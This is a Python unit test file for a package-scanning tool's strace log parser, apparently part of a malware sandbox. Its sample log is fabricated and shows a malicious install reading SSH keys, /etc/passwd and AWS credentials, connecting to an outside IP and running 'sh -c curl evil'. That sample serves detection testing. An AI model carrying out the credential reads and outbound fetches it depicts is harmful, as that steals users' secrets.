"""StraceDockerSandbox._parse_strace_log 단위 테스트.

실 docker 없이 strace 로그 샘플을 직접 넣어 파서 검증.
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.stages.stage_sandbox import StraceDockerSandbox


_SAMPLE_LOG = """
1234 execve("/usr/bin/pip", ["pip", "install", "evil-pkg"], 0x7ffe123 /* 25 vars */) = 0
1234 openat(AT_FDCWD, "/root/.ssh/id_rsa", O_RDONLY) = 5
1234 openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 6
1234 openat(AT_FDCWD, "/home/user/.aws/credentials", O_RDONLY) = 7
1234 openat(AT_FDCWD, "/usr/lib/python3.11/os.py", O_RDONLY) = 8
1234 connect(7, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("185.143.223.5")}, 16) = -1 ENETUNREACH
1234 connect(8, {sa_family=AF_INET, sin_addr=inet_addr("127.0.0.1")}, 16) = 0
1235 execve("/bin/sh", ["sh", "-c", "curl evil"], 0x12 /* 25 vars */) = 0
"""


def test_parse_network_connect():
    print("== strace parse: network connect ==")
    obs = StraceDockerSandbox._parse_strace_log(_SAMPLE_LOG, duration_s=0.5)
    print(f"  network: {obs.network_requests}")
    assert any("185.143.223.5" in n for n in obs.network_requests)
    assert any("127.0.0.1" in n for n in obs.network_requests)
    print("  OK both IPs parsed")


def test_parse_execve():
    print("\n== strace parse: execve ==")
    obs = StraceDockerSandbox._parse_strace_log(_SAMPLE_LOG, duration_s=0.5)
    print(f"  spawns: {obs.process_spawns}")
    assert any("/usr/bin/pip" in s for s in obs.process_spawns)
    assert any("/bin/sh" in s for s in obs.process_spawns)
    print("  OK both binaries detected")


def test_parse_sensitive_open():
    print("\n== strace parse: sensitive openat ==")
    obs = StraceDockerSandbox._parse_strace_log(_SAMPLE_LOG, duration_s=0.5)
    print(f"  file events: {obs.file_writes}")
    assert any(".ssh/id_rsa" in f for f in obs.file_writes)
    assert any("/etc/passwd" in f for f in obs.file_writes)
    assert any(".aws/credentials" in f for f in obs.file_writes)
    # 일반 라이브러리 파일은 skip 되어야
    assert not any("os.py" in f for f in obs.file_writes)
    print("  OK only sensitive paths recorded")


def test_parse_metadata():
    print("\n== strace parse: metadata ==")
    obs = StraceDockerSandbox._parse_strace_log(_SAMPLE_LOG, duration_s=0.7)
    assert obs.mode == "docker+strace"
    assert obs.duration_s == 0.7
    print(f"  mode={obs.mode}, duration={obs.duration_s}  OK")


def main():
    tests = [
        test_parse_network_connect,
        test_parse_execve,
        test_parse_sensitive_open,
        test_parse_metadata,
    ]
    failed = 0
    for t in tests:
        try:
            t()
        except Exception:
            import traceback
            traceback.print_exc()
            failed += 1
    print("\n" + ("ALL OK" if failed == 0 else f"FAILED: {failed}"))


if __name__ == "__main__":
    main()
